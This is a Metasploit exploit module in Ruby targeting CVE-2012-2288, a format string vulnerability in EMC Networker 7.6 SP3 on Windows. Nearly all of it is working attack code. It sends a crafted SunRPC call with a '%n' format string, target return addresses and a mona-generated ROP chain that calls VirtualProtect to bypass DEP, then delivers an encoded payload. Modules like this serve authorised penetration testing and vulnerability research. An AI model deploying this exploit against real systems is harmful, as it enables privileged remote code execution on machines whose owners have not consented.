# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::SunRPC

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;EMC Networker Format String&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a format string vulnerability in the lg_sprintf function
        as implemented in liblocal.dll on EMC Networker products. This module exploits the
        vulnerability by using a specially crafted RPC call to the program number 0x5F3DD,
        version 0x02, and procedure 0x06. This module has been tested successfully on EMC
        Networker 7.6 SP3 on Windows XP SP3 and Windows 2003 SP2 (DEP bypass).
      },
      &#039;Author&#039;         =>
        [
          &#039;Aaron Portnoy&#039;, # Vulnerability Discovery and analysis
          &#039;Luigi Auriemma <aluigi[at]autistici.org>&#039;, # Vulnerability Discovery and analysis
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2012-2288&#039; ],
          [ &#039;OSVDB&#039;, &#039;85116&#039; ],
          [ &#039;BID&#039;, &#039;55330&#039; ],
          [ &#039;URL&#039;, &#039;http://blog.exodusintel.com/2012/08/29/when-wrapping-it-up-goes-wrong/&#039; ],
          [ &#039;URL&#039;, &#039;http://aluigi.altervista.org/misc/aluigi0216_story.txt&#039; ]
        ],
      &#039;Platform&#039;       => [ &#039;win&#039; ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "\x00\x0d\x0a\x25\x2a",
          &#039;DisableNops&#039; => true,
          &#039;PrependEncoder&#039; => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
        },
      &#039;Targets&#039;        =>
        [
          [&#039;EMC Networker 7.6 SP3 / Windows Universal&#039;,
            {
              &#039;Ret&#039; => 0x7c354dac, # ret from MSVCR71.dll
              &#039;Offset&#039; => 156,
              &#039;DEP&#039; => true
            }
          ],
          [&#039;EMC Networker 7.6 SP3 / Windows XP SP3&#039;,
            {
              &#039;Ret&#039; => 0x7c345c30, # push esp # ret from MSVCR71.dll
              &#039;Offset&#039; => 156,
              &#039;DEP&#039; => false
            }
          ],
          [&#039;EMC Networker 7.6 SP3 / Windows 2003 SP2&#039;,
            {
              &#039;Ret&#039; => 0x7c354dac, # ret from MSVCR71.dll
              &#039;Offset&#039; => 156,
              &#039;DEP&#039; => true
            }
          ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => &#039;Aug 29 2012&#039;))

  end

  def exploit

    begin
      if (not sunrpc_create(&#039;tcp&#039;, 0x5F3DD, 2))
        fail_with(Exploit::Failure::Unknown, &#039;sunrpc_create failed&#039;)
      end

      fs = "%n" * target[&#039;Offset&#039;]
      fs << [target.ret].pack("V") # push esp # ret from MSVCR71.dll
      if target[&#039;DEP&#039;]
        rop_gadgets =
          [
            # rop chain generated with mona.py
            # The RopDb mixin isn&#039;t used because there are badchars
            # which must be avoided
            0x7c354dab,  # POP EBP # RETN [MSVCR71.dll]
            0x7c354dab,  # skip 4 bytes [MSVCR71.dll]
            0x7c37678f,  # POP EAX # RETN [MSVCR71.dll]
            0xfffffdff,  # Value to negate, will become 0x00000201
            0x7c34d749,  # NEG EAX # RETN [MSVCR71.dll]
            0x7c362688,  # POP EBX # RETN [MSVCR71.dll]
            0xffffffff,  #
            0x7c345255,  # INC EBX # FPATAN # RETN [MSVCR71.dll]
            0x7c363cff,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN [MSVCR71.dll]
            0x7c34592b,  # POP EDX # RETN [MSVCR71.dll]
            0xffffffc0,  # Value to negate, will become 0x00000040
            0x7c351eb1,  # NEG EDX # RETN [MSVCR71.dll]
            0x7c37765f,  # POP ECX # RETN [MSVCR71.dll]
            0x7c38ecfe,  # &Writable location [MSVCR71.dll]
            0x7c34a490,  # POP EDI # RETN [MSVCR71.dll]
            0x7c347f98,  # RETN (ROP NOP) [MSVCR71.dll]
            0x7c364612,  # POP ESI # RETN [MSVCR71.dll]
            0x7c3415a2,  # JMP [EAX] [MSVCR71.dll]
            0x7c344cc1,  # POP EAX # RETN [MSVCR71.dll]
            0x7c37a151, # ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll]
            0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN [MSVCR71.dll]
            0x7c345c30,  # ptr to &#039;push esp #  ret &#039; [MSVCR71.dll]
          ].pack("V*")
        fs << rop_gadgets
      end
      fs << payload.encoded

      xdr = XDR.encode(0, 2, rand_text_alpha(10), XDR.encode(fs, rand_text_alpha(10)), 2)
      sunrpc_call(6, xdr)
      sunrpc_destroy

    rescue Rex::Proto::SunRPC::RPCTimeout
      print_error(&#039;RPCTimeout&#039;)
    rescue EOFError
      print_error(&#039;EOFError&#039;)
    end
  end

end

